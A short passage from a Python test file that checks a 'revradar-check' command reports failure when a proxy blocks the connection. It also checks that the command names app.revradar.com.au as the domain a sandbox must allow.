    assert "can be reached" in capsys.readouterr().out


def test_revradar_check_names_the_address_a_sandbox_must_allow(monkeypatch, capsys):
    def blocked(url, timeout):
        raise aconex.urllib.error.URLError("Tunnel connection failed: 403 Forbidden")
    monkeypatch.setattr(aconex.urllib.request, "urlopen", blocked)
    assert aconex.main(["revradar-check"]) == 1
    assert "app.revradar.com.au has to be on the allowed network domains" in capsys.readouterr().err
